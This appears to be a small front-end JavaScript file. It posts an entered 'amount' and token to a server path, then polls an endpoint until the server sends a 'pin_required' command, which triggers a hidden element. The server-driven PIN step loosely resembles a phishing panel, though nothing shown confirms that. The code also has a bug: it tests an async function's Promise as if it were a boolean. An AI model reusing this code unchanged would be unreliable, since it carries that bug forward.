const postUrl = withPathName('/post/update/tokenvalue');
const apiUrl = withPathName('/api/get/checking');

document.getElementById('confirm').addEventListener('click', confirm);

function confirm(){
    if(!document.getElementById('amount').value){
        return false;
    }

    startLoading();

    postData() ? startInterval(checking, 500) : info('post fail');

}

async function postData(){
    return await fetch(postUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            value: document.getElementById('amount').value,
            _token: token
        })
    })
        .then((response) => response.json());
}

async function checking() {
    const data = await fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
    })
        .then((response) => response.json());

    if(!data.value){
        stopLoading();
        stopInterval();
        clearInputValue();
    }
    else if(data.command == 'pin_required'){
        stopLoading();
        stopInterval();
        document.getElementById('trigger').click();
    }
}
